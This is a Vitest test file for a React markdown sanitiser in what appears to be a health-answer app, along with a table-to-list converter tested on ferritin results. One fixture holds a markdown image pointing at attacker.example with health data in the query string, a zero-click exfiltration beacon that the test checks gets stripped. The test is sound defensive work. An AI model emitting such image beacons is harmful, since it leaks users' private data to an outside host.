import { describe, it, expect } from 'vitest';
import { render } from '@testing-library/react';
import ReactMarkdown from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';
import { NO_REMOTE_IMAGES, tablesToLists } from './safeMarkdown';

describe('NO_REMOTE_IMAGES', () => {
  it('drops markdown images (no zero-click beacon) but keeps text and links', () => {
    const md = 'Your ferritin is low.\n\n![x](https://attacker.example/p.png?d=ferritin-8) [source](https://pubmed.ncbi.nlm.nih.gov/1/)';
    const { container } = render(
      <ReactMarkdown rehypePlugins={[rehypeSanitize]} disallowedElements={NO_REMOTE_IMAGES}>{md}</ReactMarkdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('Your ferritin is low.');
    expect(container.querySelector('a')?.getAttribute('href')).toBe('https://pubmed.ncbi.nlm.nih.gov/1/');
  });
});

describe('tablesToLists', () => {
  // The live answer to "How has my ferritin changed?" (2026-11-26).
  const md = [
    'Your ferritin has dropped.',
    '**Your ferritin results**',
    '| Date | Ferritin | Lab reference range | Status |',
    '|---|---|---|---|',
    '| 2 June 2026 | **42 ng/mL** | 15–150 | Normal |',
    '| 10 November 2026 | **18 ng/mL** | 15–150 | Low for pregnancy |',
    'What this means',
  ].join('\n');

  it('turns a markdown table into one bullet per row, no stray pipes', () => {
    const { container } = render(<ReactMarkdown>{tablesToLists(md)}</ReactMarkdown>);
    const items = [...container.querySelectorAll('li')].map(li => li.textContent);
    expect(items).toEqual([
      'Date: 2 June 2026 · Ferritin: 42 ng/mL · Lab reference range: 15–150 · Status: Normal',
      'Date: 10 November 2026 · Ferritin: 18 ng/mL · Lab reference range: 15–150 · Status: Low for pregnancy',
    ]);
    expect(container.textContent).not.toContain('|');
    expect(container.textContent).toContain('What this means');
  });

  it('leaves text without a table alone', () => {
    const plain = 'A | B is not a table.\n\n- one\n- two';
    expect(tablesToLists(plain)).toBe(plain);
  });
});
